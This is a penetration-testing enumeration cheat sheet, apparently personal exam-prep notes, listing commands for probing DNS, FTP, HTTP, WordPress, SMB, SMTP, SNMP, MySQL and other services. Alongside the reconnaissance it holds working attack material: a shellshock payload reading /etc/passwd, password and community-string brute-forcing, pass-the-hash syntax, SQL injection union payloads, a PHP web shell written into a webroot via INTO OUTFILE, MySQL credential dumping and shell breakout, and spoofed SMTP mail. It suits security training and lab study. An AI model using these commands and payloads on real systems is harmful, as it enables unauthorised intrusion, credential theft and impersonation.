		                                                    ENUMERATION
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

DNS

find ip addresses of primary name servers for domains:
dig NS witrap.com @$ip

what is the ip-v4 address of the domain:
dig A witrap.com @$ip

this command gives you the ipv6 address of a domain:
dig AAAA witrap.com @$ip

this command figures out how many mail servers a domain has:
dig MX witrap.com @$ip

this command figures out which certificate authorities can issue certificats for a domain:
dig CAA witrap.com @$ip

what is the geopraphical location of a domain:
dig LOC witrap.com @$ip

this command figures out the administrative email of witrap.com:
dig soa witrap.com @$ip

banner grabbing:
dig version.bind CHAOS TXT @DNS

banner grabbing nmap:
--script dns-nsid

Zone transfer:
dig axfr @<DNS_IP> #Try zone transfer without domain
dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain
fierce -dns <DOMAIN> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack

more info:
dig ANY @<DNS_IP> <DOMAIN>     #Any information
dig A @<DNS_IP> <DOMAIN>       #Regular DNS request
dig AAAA @<DNS_IP> <DOMAIN>    #IPv6 DNS request
dig TXT @<DNS_IP> <DOMAIN>     #Information
dig MX @<DNS_IP> <DOMAIN>      #Emails related
dig NS @<DNS_IP> <DOMAIN>      #DNS that resolves that name
dig -x 192.168.0.2 @<DNS_IP>   #Reverse lookup
dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

FTP

The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network.
It is a plain-text protocol that uses as new line character 0x0d 0x0a so it's important to connect using telnet instead of nc.

banner grabbing:
telnet -vn <IP> 21

always check for anonymous access:
nmap -sV -sC <target>

anonymous login:
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit

download all files from ftp:
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all

*anonymous ftp access is always bad
*if ftp is tied to the webroot you can usually upload a shell and execute it from you browser by browsing to the path in the url

nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 $ip

some ftp commands:

USER username
PASS password
HELP The server indicates which commands are supported
PORT 127,0,0,1,0,80This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 
(you need to put the 5th char as "0" and the 6th as the port in decimal or use the 5th and 6th to express the port in hex).
EPRT |2|127.0.0.1|80|This will indicate the FTP server to establish a TCP connection (indicated by "2") 
with the IP 127.0.0.1 in port 80. This command supports IPv6.
LIST This will send the list of files in current folder
APPE /path/something.txt This will indicate the FTP to store the data received from a passive connection or from a PORT/EPRT connection to a file. 
If the filename exists, it will append the data.
STOR /path/something.txt Like APPE but it will overwrite the files
STOU /path/something.txt Like APPE, but if exists it won't do anything.
RETR /path/to/file A passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connection
REST 6 This will indicate the server that next time it send something using RETR it should start in the 6th byte.
TYPE i Set transfer to binary

ftp bounce:
nmap -vvvv -P0 -n -b 10.11.1.125A 10.11.1.125B -p-


--------------------------------------------------------------------------------------------------------------------------------------------------------------------HTTP

HTTP

ask yourself:
  what does the application do
  what language is it written in 
  what server software is the application running on
  what version is the web application 
  
then ask yourself:
what is the technology stack in use
what is programming language and frameworks in use
what is the web server software 
what is the database software
what is the server operating system

In this methodology we are going to suppose that you are going to a attack a domain (or subdomain) and only that. So, you should apply 
this methodology to each discovered domain, subdomain or IP with undetermined web server inside the scope.

Start by identifying the technologies used by the web server. Look for tricks to keep in 
mind during the rest of the test if you can successfully identify the tech.

Any known vulnerability of the version of the technology?

Using any well known tech? Any useful trick to extract more information?

Any specialised scanner to run (like wpscan)?

Any vulnerable cookie? JWT?

Check for vulnerable proxies being used (Test this in every new tech discovered in the webapp)

Launch general purposes scanners. You never know if they are going to find something or if the are going to find some interesting information.

Start with the initial checks: robots, sitemap, 404 error and SSL/TLS scan (if HTTPS).

Start spidering the web page: It's time to find all the possible files, folders and parameters being used. Also, check for special findings.

Note that anytime a new directory is discovered during brute-forcing or spidering, it should be spidered.

Directory Brute-Forcing: Try to brute force all the discovered folders searching for new files and directories. 

Note that anytime a new directory is discovered during brute-forcing or spidering, it should be Brute-Forced.

Backups checking: Test if you can find backups of discovered files appending common backup extensions.

Brute-Force parameters: Try to find hidden parameters.

Once you have identified all the possible endpoints accepting user input, check for all kind of vulnerabilities related to it.

This is by far the most complex part of pentesting web, and depending of the vulnerability 
the pentester should know how to discover it. In this book you can find explained a lot of web vulnerabilities related to user input.  

banner grab:
nmap -sV --script=banner $ip

bannergrab:
telnet <ip> <port>
then:
HEAD / HTTP/1.0

get the title of the webapp runinng check <title> tags:
curl http://$ip/

take a look at the webapp with the debugger tool
ctrl + shift + k

check if you can put files in specific directories on the web server:
nikto -h http://$ip/Data

whatweb:
whatweb --color=never --no-errors -a 3 -v http://$ip/

figure out what methods a webserver allows with nmap:
nmap --script http-methods $ip

Nikto:
nikto  -h http://$ip/
  
always check the source code:
ctrl u
curl

directory brute force with no recursive checks:
dirb http://$ip/ -r 
  
grab all source code:
curl -i http://$ip/

grab response header:
curl -l http://$ip/

grab robots.txt;
curl -sSik http://$ip/robots.txt

web directory enum with nmap:
nmap --script http-enum $ip

grab robots.txt and filter it:
curl -s http://$ip/robots.txt | grep Disallow | sed 's/Disallow: //'

grab web page headers
nmap --script=http-headers $ip

lfi - rfi - rce test:
uniscan -u http://192.168.44.134:10000/ -qweds

find out webserver headers:
curl --head http://$ip/

figure out options a webserver allows:
curl -i -X http://$ip/

basic get request bruteforce:
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/passwords.txt $ip http-get /Admin

shellshock exploit:
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

WordPress

enumerate Wordpress users
wpscan --url http://10.10.10.2 --enumerate u

bruteforce Wordpress user's password
wpscan --url 10.10.10.2/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2

wpscan --url http://$ip/ --enumerate ap,at,cb,dbe -o wpscan-enum.txt

nmap -sV --script http-wordpress-enum <target>

dirb http://10.11.1.234/ -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

wpscan bruteforce:
wpscan --url http://10.11.1.234/wp-login --usernames Core,Backup,admin --passwords /usr/share/wordlists/rockyou.txt

wpscan --url http://10.141.1.251/wp --enumerate vp,u,vt --plugins-detection aggressive

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

Drupal 

to enumerate drupal use droopescan:
./droopescan --help

./droopescan scan drupal -u $ip

one of the default files in drupal is changelog.txt browse it and you could get the version:
http://10.10.10.9/CHANGELOG.txt


-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

NFS

scanning nfs with nmap:
nmap -sV --script=nfs-* $ip
nmap -sV --script=nfs-ls $ip //same result as rpcinfo
nmap -sV --script=nfs-* $ip // all nfs scripts

nmap -p 111 --script=nfs-ls $ip

Enumerating NFS with Nmap:
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $ip

rpcinfo:
rpcinfo -p $ip
rpcclient -l $ip

mount NFS share:
mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock

mounting an NFS share step by step:
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

enumerate nfs shares:
showmount -e $ip

READ:
https://pentestlab.blog/tag/rpc/

See root squashing
https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

SMB

smb vuln scan:
nmap -Pn --script=smb-vuln* $ip

enumerate shares with nmap:
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip

discover the version of samba running:
nmap -Pn -p 139,445 -v --script="smb-protocols" -sV $ip

discovering the version of samba running:
nmap --script smb-os-discovery.nse -p 445 $ip

get the os version of smba server using rpcclient:
rpcclient -U "" -N $ip
> srvinfo

get the OS version of samba using enum4linux:
enum4linux -o $ip

find the netbios computer name of samba using nmblookup:
nmblookup -A $ip

test weather anonymous connection is allowed:
smbclient -L $ip -N

scanning for smb shares with nmap:
nmap --script smb-enum-shares.nse -p445 $ip

listing shares with enum4linux:
enum4linux -S $ip

scanning for smb shares:
smbmap -H $ip

Downloadig files from a share:
smbget -R smb://<ip>/anonymous

connecting to an smbshare:
smbclient //$ip/$share

enum4linux: 
enum4linux -a $ip

get domain groups that exsist on the samba server using enum4linux:
enum4linux -G $ip

get shares:
smbclient -L \\\\<victim-ip> -N

connect to a share:
smbclient \\\\<victim-ip>\\<share>

connect to a share:
smbclient //<victim-ip>/<share>

smb os discovery:
nmap $ip --script=smb-os-discovery

nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip

enumerate hostname:
nmblookup -A 10.11.1.115

enumerate shares:
nmap --script smb-enum-shares -p 139,445 $ip

check for vulnerabilities:
nmap --script smb-vuln* -p 139,445 10.11.1.115

manually probe an smbserver:
rpcclient -U '' $ip
password:
rpcclient $> srvinfo # operating system version
rpcclient $> netshareenumall # enumerate all shares and its paths
rpcclient $> enumdomusers # enumerate usernames defined on the server
rpcclient $> getdompwinfo # smb password policy configured on the server

list shared folders:
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user

connect list a shared folder:
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash

SMBMAP
Smbmap -H 10.10.10.100 list all the file shares and what permissions we have 

Smbmap -F will help you search for strings in files

list the folders in a share:
smbmap -R <share> -H $ip

will list the files in the replication share 
Smbmap -R Replication -H 10.10.10.100 

This command will download group xml and do it in quite mode because of the -q parameter 
Smbmap -R replication -H 10.10.10.100 -A Groups.xml -q. 

The command gpp-decrypt helps decrypt strings 
With smbclient mget* downloads every file
Smbmap -d active.htb -u svc_tgs -p password -H 10.10.10.100 - this command will log in with the username and password specified 

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

SMTP

smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip

always connect with netcat to view relevant information:
nc $ip $port

enumerating users:
connect with netcat:
	nc $ip 25
say helo and declare yourself:
	HELO attacker.xyz
verify us a user exsists dont forget the domain name:
	VRFY admin@victim-1 (victim-1 is the domain name)

what commands can be used to check the supported commands and capabilities:
telnet 10.11.1.10 25 
	HELO attacker.xyz
		EHLO attacker.xyz
			HELP

bruteforce usernames:
smtp-user-enum -U /usr/share/comix/src/txt/usernames.txt -t $ip

connect to smtp service using telnet and send fake mail to a root user:
telnet 192.186.235.3 25
	HELO attacker.xyz
		mail from: admin@attacker.xyz
			rcpt to: root@victim-1
				data
					Subject: Hi Root
						Hello,
							This is a fake mail sent using telnet command.
								From,
									Admin

send a fake mail to root user using sendmail command:
​sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.186.235.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

SNMP 

first things first is get the community strings





onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd 10.11.1.241

msf > use auxiliary/scanner/snmp/snmp_login
msf > use auxiliary/scanner/snmp/snmp_enum

nmap scanning snmp
nmap -sU -p 161 -sV -n -sC $ip

nmap scanning snmp for open ports:
nmap -sU -sV -p 262 -n $ip --script="snmp-netstat" --script-args="snmpcommunity=$password"

nmap scanning snmp for running processes:
nmap -sU -sV -p- 161 -n $ip --script="snmp=processes" --script-args="snmpcommunity=$password-string"

bruteforcing community strings with snmp-brute.nse:
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]

snmp-check 192.168.1.2 -c public

snmpget -v 1 -c public IP

snmpwalk -v 1 -c public IP

snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

onesixtyone -c /usr/share/wordlists/dirb/small.txt 192.168.1.200 // find communities with bruteforce

for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt);do snmpwalk -v 1 -c $i 192.168.1.200;done| grep -e "Timeout" // find communities with bruteforce

snmpcheck -t $ip -c public/private

snmpwalk -c public -v1 $ip 1|

snmpenum -t $ip

onesixtyone -c names -i hosts

SNMPv3 Enumeration
nmap -sV -p 161 --script=snmp-info $ip/24

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

Mysql

we can access a remote mysql database with this command:
mysql -h 192.154.94.3 -u root -ppassword

within a mysql shell MYSQL > we can enumerate the target server arch and OS name with this command:
show variables like '%compile%';

connect local:
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)

connect remote:
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost

enumeration:
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds

Basic $ interesting MySQL commands:
show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Try to execute code
select do_system(‘id’);
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;

Privilege escalation:
Current Level of access
mysql>select user();
mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
Access passwords
mysql> use mysql
mysql> select user,password from user;
Create a new user and grant him privileges
mysql>create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
Break into a shell
mysql> \! cat /etc/passwd
mysql> \! bash

extracting MySQL credntials from the database:\
SELECT User,Host,Password FROM mysql.user;
SELECT User,Host,authentication_string FROM mysql.user;

mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 

SSH 

banner grabbing:
nc -vn <IP> 22

public ssh key of server
ssh-keyscan -t rsa <IP> -p <PORT>

config files:
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
									
RPC

port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. 
When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 





















  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  









